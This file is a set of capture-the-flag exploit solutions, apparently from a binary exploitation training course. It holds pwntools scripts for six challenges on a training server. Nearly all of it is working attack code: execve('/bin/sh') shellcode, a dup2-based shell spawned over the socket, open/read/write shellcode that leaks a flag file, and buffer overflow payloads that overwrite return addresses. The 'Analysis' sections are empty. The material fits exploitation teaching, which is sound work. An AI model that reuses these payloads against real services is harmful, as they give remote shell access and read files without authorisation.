# shellcode
### Analysis
### Exploit
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
#context.terminal = ['gnome-terminal', '-e']
# ssh = ssh("acidburn", "192.168.56.103")
# r = ssh.process("./shellcode")
# gdb.attach(r, """
# 	c
# 	""")

r = remote("training.jinblack.it", 2001)

#input("wait")
print(r.recvuntil("name?\n"))

buffer = 0x601080

# First shellcode
# mov rax, 0x3b
# mov rdi, 0x601148
# mov rsi, 0x601150
# mov rdx, 0x601150
# syscall

shellcode = b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\x48\x11\x60\x00\x48\xC7\xC6\x50\x11\x60\x00\x48\xC7\xC2\x50\x11\x60\x00\x0F\x05"
shellcode = shellcode.ljust(200, b"\x90")
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

#second shellcode
# jmp endshellcode
# shellcode:
# pop rdi
# mov rsi, rdi
# add rsi, 8
# mov rdx, rsi
# mov rax, 0x3b
# syscall

# endshellcode:
# call shellcode
# nop



shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

payload = shellcode.ljust(1016, b"\x90") + p64(buffer)

r.send(payload)

r.interactive()
```

# sh3llc0d3
### Analysis
### Exploit
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
r = remote("training.jinblack.it", 2002)
#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x0804c060

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = b"\x90" * 184 + shellcode + p32(buffer)

payload = payload.ljust(1000, b"\x90") 

r.send(payload)

r.interactive()

# multistage
### Analysis
### Exploit
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

context.terminal = ['gnome-terminal', '-e']
r = process("./multistage")
gdb.attach(r, """
	c
	""")
#r = remote("training.jinblack.it", 2003)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x404070

read = b"\x90\x90\x90\x90\x48\x89\xC6\x6A\x2F\x5A\x48\x31\xC0\x48\x31\xFF\x0F\x05\xFF\xE6"
nop = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode = b"\x31\xC0\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x99\x52\x57\x54\x5E\xB0\x3B\x0F\x05"

payload = read + nop + shellcode

r.send(payload)

r.interactive()

# gimme3bytes
### Analysis
### Exploit
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

context.terminal = ['gnome-terminal', '-e']
#r = process("./gimme3bytes")
#gdb.attach(r, """
#	c
#	""")
r = remote("training.jinblack.it", 2004)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x404070

read = b"\x5a\x0f\x05"
nop = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode = b"\x31\xC0\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x99\x52\x57\x54\x5E\xB0\x3B\x0F\x05"

payload = read + nop + shellcode
#payload = read + shellcode
r.send(payload)

r.interactive()

# server
### Analysis
### Exploit
from pwn import *
import time
#context.terminal = ['tmux', 'splitw', '-h']
'''
context.terminal = ['gnome-terminal', '-e']
r = process("./shellcode")
gdb.attach(r, """
	c
	""")
'''
r = remote("training.jinblack.it", 2005)
#r = remote("localhost", 2005)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x4040c0
buffer_jump = 0x4040d0

'''
DUP2 IN
mov rax, 0x21
mov rdi, 0x4
mov rsi, 0x0
syscall

DUP2 OUT
mov rax, 0x21
mov rdi, 0x4
mov rsi, 0x1
syscall

EXECVE
mov rax, 0x3b
mov rdi, 0x4040c0
xor rsi, rsi
xor rdx, rdx
syscall

'''

dup2_in = b"\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC7\x04\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05"
dup2_out = b"\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC7\x04\x00\x00\x00\x48\xC7\xC6\x01\x00\x00\x00\x0F\x05"
execve = b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05"

shellcode = b"/bin/sh\x00"

xxx = dup2_in + dup2_out + execve

shellcode = shellcode + xxx.rjust(1008, b"\x90")
payload = shellcode + p64(buffer_jump)

r.send(payload)

r.interactive()

# -----------

from pwn import *
import time
#context.terminal = ['tmux', 'splitw', '-h']
'''

FUNZIONA, MA SAREBBE FICO ANCHE RISOLVERLA USANDO DUP2, ANCHE SE È PRATICAMENTE LA STESSA COSA

context.terminal = ['gnome-terminal', '-e']
r = process("./shellcode")
gdb.attach(r, """
	c
	""")
'''
r = remote("training.jinblack.it", 2005)
#r = remote("localhost", 2005)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x4040c0
buffer_jump = 0x4040d0

'''
OPEN
mov    r8,rdi    SAVE THE ACTUAL FILE DESCRIPTOR OF THE SOCKET, dopo un po' di prove si vede che si trova in rdi (c'è una read prima dell'overflow)
mov    rax,0x2
mov    rdi,0x4040c0
xor    rsi,rsi
xor    rdx,rdx
syscall 

READ
mov    rdi,rax
xor    rax,rax
mov    rsi,0x4040c0
mov    rdx,0x100
syscall 

WRITE
mov rdi, r8
mov rax, 0x1
mov rsi, 0x4040c0
mov rdx, 0x100
syscall

'''

open_sh = b"\x49\x89\xF8\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05"
read_sh = b"\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"
write_sh = b"\x4C\x89\xC7\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"

shellcode = b"./flag\x00\x00"

xxx = open_sh + read_sh + write_sh

shellcode = shellcode + xxx.rjust(1008, b"\x90")
payload = shellcode + p64(buffer_jump)

r.send(payload)

r.interactive()

# onlyreadwrite
### Analysis
### Exploit
from pwn import *
import time
#context.terminal = ['tmux', 'splitw', '-h']

'''

PER QUALCHE MOTIVO IGNOTO NON FUNZIONA PIU, PROBABILMENTE HO TOCCATO QUALCOSA DIO CAN
RIFARE CON LO STESSO MODO DI SERVER, TANTO È UGUALE

context.terminal = ['gnome-terminal', '-e']
r = process("./shellcode")
gdb.attach(r, """
	c
	""")
'''
r = remote("training.jinblack.it", 2006)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x4040c0
buffer_jump = 0x4040d0
'''
OPEN
mov    rax,0x2
mov    rdi,0x4040c0
xor    rsi,rsi
xor    rdx,rdx
syscall 

READ
mov    rdi,rax
xor    rax,rax
mov    rsi,0x4040c0
mov    rdx,0x100
syscall 

WRITE
mov rax, 0x1
mov rdi, 0x1
mov rsi, 0x4040c0
mov rdx, 0x30
syscall
'''

#read_path = b"\x48\x31\xC0\x48\x31\xFF\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x40\x00\x00\x00\x0F\x05"

#open_sh = b"\xcc\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\x31\xF6\x0F\x05"
open_sh = b"\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05"
read_sh = b"\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"
write_sh = b"\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x30\x00\x00\x00\x0F\x05"
#shellcode = read_sh
shellcode = b"./flag\x00\x00"
shellcode = shellcode.ljust(942, b"\x90")
shellcode = shellcode + open_sh + read_sh + write_sh



shellcode = shellcode + p64(buffer_jump)
payload = shellcode


r.send(payload)

r.interactive()

